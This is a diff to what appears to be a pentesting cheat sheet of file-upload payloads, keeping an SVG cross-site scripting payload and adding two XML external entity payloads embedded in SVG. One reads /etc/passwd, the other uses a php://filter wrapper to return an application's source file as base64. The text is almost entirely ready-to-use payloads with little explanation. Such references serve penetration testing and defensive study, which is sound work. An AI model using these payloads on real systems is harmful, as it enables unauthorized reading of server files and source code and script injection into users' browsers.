@@ -1,6 +1,3 @@
-
-
-
 ### XSS
 
 XSS via image metadata
@@ -17,3 +14,23 @@ XSS via svg file
     <script type="text/javascript">alert(window.origin);</script>
 </svg>
 ```
+
+
+### XXE
+
+Reading file
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+
+
+Getting base64 of php resource
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+
